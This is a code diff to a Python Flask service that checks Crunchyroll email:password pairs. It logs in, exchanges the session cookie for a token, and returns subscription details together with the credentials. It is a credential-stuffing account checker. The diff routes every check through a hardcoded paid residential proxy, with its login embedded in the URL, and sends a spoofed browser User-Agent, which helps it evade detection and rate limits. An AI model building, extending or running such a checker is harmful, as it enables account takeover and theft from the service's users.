@@ -4,15 +4,19 @@ from datetime import datetime
 import pytz
 
 AUTH_HEADER = "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6"
+USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
+PROXY_URL = "http://PP_1D1E5YMPFG-country-IN:5vl30ay0@evo-pro.porterproxies.com:61236"
+
 app = Flask(__name__)
 
-async def check_crunchyroll(email, password, proxy=None):
+async def check_crunchyroll(email, password, use_proxy=True):
+    proxy = PROXY_URL if use_proxy else None
     async with httpx.AsyncClient(timeout=30, proxies=proxy if proxy else None) as client:
         try:
             # 1. Login to get etp_rt cookie
             login_headers = {
                 "Authorization": AUTH_HEADER,
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+                "User-Agent": USER_AGENT,
                 "Origin": "https://www.crunchyroll.com",
                 "Referer": "https://www.crunchyroll.com/login",
                 "Content-Type": "application/x-www-form-urlencoded"
@@ -40,9 +44,9 @@ async def check_crunchyroll(email, password, proxy=None):
             token_headers = {
                 "Authorization": AUTH_HEADER,
                 "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": login_headers["User-Agent"],
-                "Origin": login_headers["Origin"],
-                "Referer": login_headers["Referer"],
+                "User-Agent": USER_AGENT,
+                "Origin": "https://www.crunchyroll.com",
+                "Referer": "https://www.crunchyroll.com/login",
             }
             token_data = {
                 "grant_type": "etp_rt_cookie"
@@ -68,9 +72,9 @@ async def check_crunchyroll(email, password, proxy=None):
             sub_headers = {
                 "Authorization": f"Bearer {token}",
                 "Accept": "application/json",
-                "User-Agent": login_headers["User-Agent"],
-                "Referer": login_headers["Referer"],
-                "Origin": login_headers["Origin"]
+                "User-Agent": USER_AGENT,
+                "Referer": "https://www.crunchyroll.com/login",
+                "Origin": "https://www.crunchyroll.com"
             }
 
             sub_res = await client.get(
@@ -87,10 +91,10 @@ async def check_crunchyroll(email, password, proxy=None):
         except Exception as e:
             return {"error": str(e)}, 500
 
-def run_async_check(email, password, proxy=None):
+def run_async_check(email, password, use_proxy=True):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    result, code = loop.run_until_complete(check_crunchyroll(email, password, proxy))
+    result, code = loop.run_until_complete(check_crunchyroll(email, password, use_proxy))
     return result, code
 
 def format_summary(data, email, password):
@@ -126,30 +130,22 @@ def format_summary(data, email, password):
 def chk():
     if request.method == 'POST':
         chk_param = request.form.get("chk") or (request.json and request.json.get("chk"))
-        proxy_param = request.form.get("proxy") or (request.json and request.json.get("proxy"))
+        use_proxy = True
     else:  # GET
         chk_param = request.args.get("chk")
-        proxy_param = request.args.get("proxy")
+        use_proxy = True
     if not chk_param or ':' not in chk_param:
-        return jsonify({"error": "Usage: chk=email:pass, proxy=host:port:user:pass (proxy optional)"}), 400
+        return jsonify({"error": "Usage: chk=email:pass"}), 400
     email, password = chk_param.split(":", 1)
-    proxy = None
-    if proxy_param:
-        try:
-            host, port, user, pwd = proxy_param.split(":")
-            proxy = f"http://{user}:{pwd}@{host}:{port}"
-        except Exception:
-            return jsonify({"error": "Invalid proxy format"}), 400
-    result, code = run_async_check(email.strip(), password.strip(), proxy)
-    # If Crunchyroll returned subscriptions
+    result, code = run_async_check(email.strip(), password.strip(), use_proxy)
     if code == 200 and "subscriptions" in result and isinstance(result["subscriptions"], list) and result["subscriptions"]:
         summary = format_summary(result, email.strip(), password.strip())
         return summary, 200, {"Content-Type": "text/plain; charset=utf-8"}
     else:
-        # Show a friendly error if invalid/free
         if result.get("error"):
             return f"❌ {result.get('error')}", code, {"Content-Type": "text/plain; charset=utf-8"}
         return jsonify(result), code
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
+        
